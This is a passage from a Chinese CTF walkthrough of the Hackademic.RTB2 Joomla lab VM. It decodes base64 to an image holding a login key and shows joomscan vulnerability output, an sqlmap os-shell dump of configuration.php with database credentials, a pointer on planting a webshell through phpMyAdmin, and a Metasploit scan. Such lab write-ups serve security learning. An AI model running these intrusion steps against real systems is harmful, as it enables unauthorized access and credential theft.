0JD4A/kxxzJ/19y4Zn6MrQckVRM9qEBTX1+f+ANTpOPhJJhCyo2iKN7w/PPPT/qnipINnHfeeYk/
sGvXLg/OP48++mjiDySVc8qiyo2iKA7zjW98I8FPb731Vs8kUZTJ8a1vfSvxByaR5jYJHnvsscSV
sS699FI13oyLKjeKojjMjh07JtJvvvOd72zevNljeRQlLW6++eZzzz03wQd++tOf/vGPf/RGmPPP
Pz/xB5599llvJMktVLlRFMV5vvrVr1511VXhcNj8n9ddd90tt9zil0iKkgp333134uo1t9xyyzXX
XOOZPLt27Vq8ePGuXbsm+kBdXV1TU9PatWs9EyknKPRbAEVJRHFx8ZVXXrl+/fpt27Y9/PDDjY2N
fkuUM1RVVV155ZXr1q3btm3bL3/5y46Ojklc5GMf+9gFF1zw4osvPvnkk0eOHEnrd++///7777//
kksuqa2ttWrGT0KAzLHGYe3atW1tbRle6o033pjEOChZjj1DSktLN27cOPYDDQ0Njz766ObNm0dG
Rh599NFoNOqxhPX19Wecccbq1avPOuusNWvWLFmyZMOGDeYH5s2b9/LLL+/YsWP79u3btm177bXX
tmzZ4rGQim8kTqiLTZk03Rwah7EVpSfRKnkibr755sTf4ic/+Um618yesb3ttttG/eLtt9+e1ne5
4oorMh+QSePeOGRO6uOQ9FJJ54Mb18yPdcwpks6Qq6++2m8Zx2HJkiXHjh1LILb2Z5hC6KJgkSvj
MNGi41QHnDxWbu66665xfzf1JjgTlUb9y1/+kuIVMsTVccicFMch6XVUufGXpDPkyiuv9FvGRCQu
8dfb2+u3gIon6KJgkRPjsGrVqgTXd6RuVb4qN2vWrEnw66k0lEhcxPbaa69NY0Qmi9vjkDmpjEPS
i6hy4yNJZ8jOnTv9ljEJGzZsSPwV/vSnP/kto29oQLGSjSTOJXavWV0e8PWvfz3BT7/zne8kvULi
JtXf/OY305bJDxKPQ+bkyjgoE5F0hvzrv/6rN5JMmieffDJxJNlFF100ZetNq3KjZCNnnnlmgp8u
Xbp01qxZngmTWyQu6rVmzZrCwiRpBCtWrEjw01mzZuXEcul2cbNcGQdlIpLOkG3btnkjSSbs2LEj
8QembJU/VW7SIGlLOe055xRJC58vXLjQG0lyjqTl+ZN+IGn1/Zwozz8qC90NcmIclIlI+iI0Nzc7
da/PfOYze/bsicVinZ2djzzyyIwZM5y6clIhk37NfEWVmzTYu3dvgp82Nzcn7QOipMK6deuSfmbZ
smUeSKLkLtrkQckSXnvttR/84AennnoqUFNTc+mll7a3t09Zg4pnqHKTBl/60pcS/PSf//mfvRIk
z7njjjuSfubb3/62B5IouYvbMTeKkgovvPDCuM3Dn3vuOXVruooqN2lQX19/3XXXjfujTZs23Xff
fR7Lk5dcf/3169evT/qxRYsWpZ7YrExBXnnllVSipxXFPS655JIEbRx+85vfeCnMVEOVm/S47777
LrvsslHu/Hvuuee9732vXyLlE7fffnvqKsv111//4IMPBoM6h5XxueWWW7Tbg+IjH/vYxxL8dPXq
1UmDC5VJo+0X0uahhx566KGHPvCBD1RWVpaWlj766KMtLS1+C5XDXHHFFZWVlatXr7788svHjX17
+OGH9+/fP2/evI0bN476wOWXX3755ZdbHzhw4MDDDz/c09PjleBKDvCd73zn+9///uWXX758+fKR
kZHEH66trR07xxRl0iTt17148eKGhgZPZJlyqHIzSfxqlJNPXH311T/72c8SfOChhx76yEc+Yndy
+cQnPvHNb37zn/7pn0Z9zG4H87Of/exb3/pW4tAoZaoxMjJy//33p/jhieaYokyCxYsXJ/7AnDlz
vJFkCqImfcUfvvKVryTWbH74wx9edtllo3rUffnLX54o7MnitttuU0+2kglJ55iipMLatWuTVotO
7LdSMkGVG8UH1q5dm7iP4969ez/72c+O+6P77rvvz3/+c4Lf/fCHP3zFFVdkJJ8ytUk6xxQlKb/4
xS+Sfubiiy9es2aN+7JMRVS5UXwgqdn/85//fIKf3nrrrYl/XRPFlQxJOscUJQFPPPGEVdgmKVu3
bk3xk0paqHKj+EDSAlZ79uxJ8NNdu3Z1dXUl+EBtbW3SUD5FSUDSOaYoYykvL/+Hf/iHpqamDRs2
pP5be/bs+d73vqeFSZ1FlRvFB5K6opPuK4cOHXJOHEUZB1VulBS58sort27d2tnZ2d/f//jjj8+b
N2/UBx5++OF3vOMd1dXVJ5544nXXXTe2N8iNN964b9++WCx29OjRBx54oLy83CvZ8xZVbpScJHGn
i7a2Nm2FoSiKB2zduvWBBx5Ys2bNRGe2888//0Mf+tCWLVt6enqOHDly3333FRUV7dq1a9wP19bW
Xnnllf39/Qmq/ympoMqNkpMkzve+6667PJNEUZQpy0svvZQ4Ivi9733vuG3OzjjjjMQ9L1944QWN
xckEVW6UnGTv3r1f/OIXx/3R5s2bte6+oihuc9FFFyXu8vvYY49t2rRpop++733vS3z9Bx98cJKS
KarcKLnLv/zLv9xwww2j/udDDz10zjnn+CKPoihTiptuuinxB37+858n+OmWLVsSG29WrVqlxptJ
o8qNksPcc889JSUln/zkJ7///e9/8pOfPOWUUy677DK/hVIUZUpw8sknJ/7AkSNHEn/grbfeyvAW
ykRo+wUltxkZGUl8PFIURVGmGmq5URRFURQlr1DlRlEURVGUvEKVG0VRFEVR8gpVbhRFURRFySum
kHLT19eX+AOVlZXeSKJMWZLOMZ2EFknHobe3120ZkjYJ8UCGsWS+jmXD2CqK20wh5Wbbtm2JP6Ct
5xW3STzHamtrZ82a5ZkwWUvScejr69u/f7+rMixdujSxcuOBDOOS4TqWDWOrKB4whZSbO+64I/EH
br31Vm8kUaYsiefYF77wBc8kyWaSjsO//du/uS3DnXfe6bsM45LhOpYNY6soHjCFlJu//vWvDz30
UIIPrF279tprr/VMHmUKkmCOnXvuuTfeeKPH8mQhScdh9+7dX/3qV12V4dprr924caO/MkxEJutY
NoytonjDFFJugMsuu+yee+5J8IF777335ptv9kweZQoy7hy79NJLX3jhBV/kySqSjsOmTZtOP/10
V2X42te+du+99/orQ2Imt45lw9gqimdMuQrFN9xww/e+972PfvSjCxYsWLRo0fr160d94K677rrh
hht+/etf79u3r76+/tlnn/VFTiWPMedYeXn5xz/+8akc77V69eqlS5fOmDFjonHYsWPH/v37e3p6
fvrTn27ZssUNGZYtW7Zq1aply5Zdc801tbW1Yz+wf//+HTt2uCpDWqS1jiWYYx6MraIoPjBnzpwn
nngiNjGdnZ2XXHKJ32I6SYIva5E0SeTQoUOJr7Bq1Sq3Zcicm2++ObEMP/nJT9K9ZtLvlTkejG3m
zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e
/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5
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
AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII='''
 
imgdata=base64.b64decode(strs)
file=open('key.png','wb')
file.write(imgdata)
file.close()
```

python3运行即可得到图片，原图如下：

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/key.png)

还可以使用在线工具直接将base64字符串转成图片：

[Convert Your Base64 to Image](https://codebeautify.org/base64-to-image-converter)

登陆密码即在图片中，挑战完成，帅！！！

#### 其它方法

 - 使用joomscan扫描可以发现存在非常多的漏洞，远程代码执行，sql注入等等，下载对应的poc或者脚本运行即可

``` bash
root@kali:~# joomscan -u http://192.168.84.143:666/
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.84.143:666/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 1.5

[+] Core Joomla Vulnerability
[++] Joomla! 1.5 Beta 2 - 'Search' Remote Code Execution
EDB : https://www.exploit-db.com/exploits/4212/

Joomla! 1.5 Beta1/Beta2/RC1 - SQL Injection
CVE : CVE-2007-4781
EDB : https://www.exploit-db.com/exploits/4350/
                                                                                                       
Joomla! 1.5.x - (Token) Remote Admin Change Password                                                   
CVE : CVE-2008-3681                                                                                    
EDB : https://www.exploit-db.com/exploits/6234/                                                        
                                                                                                       
Joomla! 1.5.x - Cross-Site Scripting / Information Disclosure                                          
CVE: CVE-2011-4909                                                                                     
EDB : https://www.exploit-db.com/exploits/33061/                                                       
                                                                                                       
Joomla! 1.5.x - 404 Error Page Cross-Site Scripting                                                    
EDB : https://www.exploit-db.com/exploits/33378/                                                       
                                                                                                       
Joomla! 1.5.12 - read/exec Remote files                                                                
EDB : https://www.exploit-db.com/exploits/11263/                                                       
                                                                                                       
Joomla! 1.5.12 - connect back Exploit                                                                  
EDB : https://www.exploit-db.com/exploits/11262/                                                       
                                                                                                       
Joomla! Plugin 'tinybrowser' 1.5.12 - Arbitrary File Upload / Code Execution (Metasploit)              
CVE : CVE-2011-4908                                                                                    
EDB : https://www.exploit-db.com/exploits/9926/                                                        
                                                                                                       
Joomla! 1.5 - URL Redirecting                                                                          
EDB : https://www.exploit-db.com/exploits/14722/                                                       
                                                                                                       
Joomla! 1.5.x - SQL Error Information Disclosure                                                       
EDB : https://www.exploit-db.com/exploits/34955/                                                       
                                                                                                       
Joomla! - Spam Mail Relay                                                                              
EDB : https://www.exploit-db.com/exploits/15979/                                                       
                                                                                                       
Joomla! 1.5/1.6 - JFilterInput Cross-Site Scripting Bypass                                             
EDB : https://www.exploit-db.com/exploits/16091/                                                       
                                                                                                       
Joomla! < 1.7.0 - Multiple Cross-Site Scripting Vulnerabilities                                        
EDB : https://www.exploit-db.com/exploits/36176/                                                       
                                                                                                       
Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution                                        
CVE : CVE-2015-8562                                                                                    
EDB : https://www.exploit-db.com/exploits/38977/                                                       
                                                                                                       
Joomla! 1.0 < 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution                  
CVE : CVE-2015-8562 , CVE-2015-8566                                                                    
EDB : https://www.exploit-db.com/exploits/39033/                                                       
                                                                                                       
Joomla! 1.5.0 Beta - 'pcltar.php' Remote File Inclusion                                                
CVE : CVE-2007-2199                                                                                    
EDB : https://www.exploit-db.com/exploits/3781/                                                        
                                                                                                       
Joomla! Component xstandard editor 1.5.8 - Local Directory Traversal                                   
CVE : CVE-2009-0113                                                                                    
EDB : https://www.exploit-db.com/exploits/7691/                                                        
                                                                                                       
                                                                                                       
                                                                                                       
[+] Checking Directory Listing                                                                         
[++] directory has directory listing :                                                                 
http://192.168.84.143:666/tmp                                                                          
                                                                                                       
                                                                                                       
[+] Checking apache info/status files                                                                  
[++] Readable info/status files are not found                                                          
                                                                                                       
[+] admin finder                                                                                       
[++] Admin page : http://192.168.84.143:666/administrator/                                             
                                                                                                       
[+] Checking robots.txt existing                                                                       
[++] robots.txt is found                                                                               
path : http://192.168.84.143:666/robots.txt                                                            
                                                                                                       
Interesting path found from robots.txt                                                                 
http://192.168.84.143:666/administrator/                                                               
http://192.168.84.143:666/cache/                                                                       
http://192.168.84.143:666/components/                                                                  
http://192.168.84.143:666/images/                                                                      
http://192.168.84.143:666/includes/                                                                    
http://192.168.84.143:666/installation/                                                                
http://192.168.84.143:666/language/                                                                    
http://192.168.84.143:666/libraries/                                                                   
http://192.168.84.143:666/media/                                                                       
http://192.168.84.143:666/modules/                                                                     
http://192.168.84.143:666/plugins/                                                                     
http://192.168.84.143:666/templates/                                                                   
http://192.168.84.143:666/tmp/                                                                         
http://192.168.84.143:666/xmlrpc/                                                                      
                                                                                                       
                                                                                                       
[+] Finding common backup files name                                                                   
[++] Backup files are not found                                                                        
                                                                                                       
[+] Finding common log files name                                                                      
[++] error log is not found                                                                            
                                                                                                       
[+] Checking sensitive config.php.x file                                                               
[++] Readable config file is found                                                                     
 config file path : http://192.168.84.143:666/configuration.php-dist 
```

 - 使用sqlmap查看配置文件中的phpmyadmin的用户名和密码，然后利用phpmyadmin写木马

``` bash
os-shell> cat configuration.php
do you want to retrieve the command standard output? [Y/n/a] command standard output:
---
<?php
class JConfig {
/* Site Settings */
var $offline = '0';
var $offline_message = 'This site is down for maintenance.<br /> Please check back again soon.';
var $sitename = 'Hackademic.RTB2';
var $editor = 'tinymce';
var $list_limit = '20';
var $legacy = '0';
/* Debug Settings */
var $debug = '0';
var $debug_lang = '0';
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
/* Server Settings */
var $live_site = '';
var $secret = 'iFzlVUCg9BBPoUDU';
var $gzip = '0';
var $error_reporting = '-1';
var $helpurl = 'http://help.joomla.org';
var $xmlrpc_server = '0';
var $ftp_host = '127.0.0.1';
var $ftp_port = '21';
var $ftp_user = '';
var $ftp_pass = '';
var $ftp_root = '';
var $ftp_enable = '0';
var $force_ssl = '0';
/* Locale Settings */
var $offset = '0';
var $offset_user = '0';
/* Mail Settings */
var $mailer = 'mail';
var $mailfrom = 'admin@hackademirtb2.com';
var $fromname = 'Hackademic.RTB2';
var $sendmail = '/usr/sbin/sendmail';
var $smtpauth = '0';
var $smtpsecure = 'none';
var $smtpport = '25';
var $smtpuser = '';
var $smtppass = '';
var $smtphost = 'localhost';
/* Cache Settings */
var $caching = '0';
var $cachetime = '15';
var $cache_handler = 'file';
/* Meta Settings */
var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
var $MetaKeys = 'joomla, Joomla';
var $MetaTitle = '1';
var $MetaAuthor = '1';
/* SEO Settings */
var $sef           = '0';
var $sef_rewrite   = '0';
var $sef_suffix    = '0';
/* Feed Settings */
var $feed_limit   = 10;
var $feed_email   = 'author';
var $log_path = '/var/www/logs';
var $tmp_path = '/var/www/tmp';
/* Session Setting */
var $lifetime = '15';
var $session_handler = 'database';
}
?>
---
```

账号密码为:root/yUtJklM97W

具体参考：[phpmyadmin getshell](https://www.jianshu.com/p/ddd41b841c36)

 - 使用msf中的auxiliary/scanner/http/joomla_plugins模块扫描

``` bash
root@kali:~# msfdb run
[+] Starting database
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v5.0.63-dev                          ]
+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use auxiliary/scanner/http/joomla_plugins
msf5 auxiliary(scanner/http/joomla_plugins) > set RHOSTS 192.168.84.143
RHOSTS => 192.168.84.143
msf5 auxiliary(scanner/http/joomla_plugins) > set RPORT 666
RPORT => 666
msf5 auxiliary(scanner/http/joomla_plugins) > exploit 

[+] Plugin: /administrator/ 
